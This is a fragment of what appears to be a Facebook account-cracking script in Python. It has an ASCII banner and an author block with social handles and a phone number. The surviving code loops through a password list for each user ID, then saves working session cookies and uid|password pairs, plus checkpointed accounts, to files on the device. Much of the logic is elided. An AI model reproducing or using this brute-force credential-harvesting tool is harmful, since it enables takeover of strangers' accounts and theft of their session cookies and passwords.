...
.d8888.   . d8b.     .88b     d88.    .d8b.       d8b    db     d8888b.    .     d8b.       d8888b. 
 88'  YP   d8' `8b    88' Yb  dP`  88     d8'  `888o. 88   88     `    8D   d8' `   8b    88  `   8D 
 `8bo.    88ooo88  88  88  88   88ooo88   88V808    88           88   88ooo88   88oobY' 
   `Y8b. 88~~~88 88  88  88   88~~~88  88    V80   88.          88  88~~~88  88 `   8b   
db   8D 88        88 88  88  88   88        88  88       88.  88         .8D  88        88   88 `    88. 
8888Y' YP       YP YP  YP  YP  YP        YP  VP      V8   Y8888D'.     88         YD  88.        YD
==============================================
\033[1;32m----------------------------------------------
 Owner        :   SAMANDAR
 AUTHOR       :   SHARABYANO RAESS
 FACEBOOK     :  ALIYAxKHANx302
 GITHUB       :   Samandar786
 WHATSAPP     :   +923015948415
 TOOL         :   Free
 VIRSION      :    2.9
\033[1;37m----------------------------------------------"""
def linex():
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/KING SAMANDAR.txt','a').write(coki+'\n')
                                        open('/sdcard/KING SAMANDAR R.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [SAMANDAR R👉CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/SAMANDAR R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
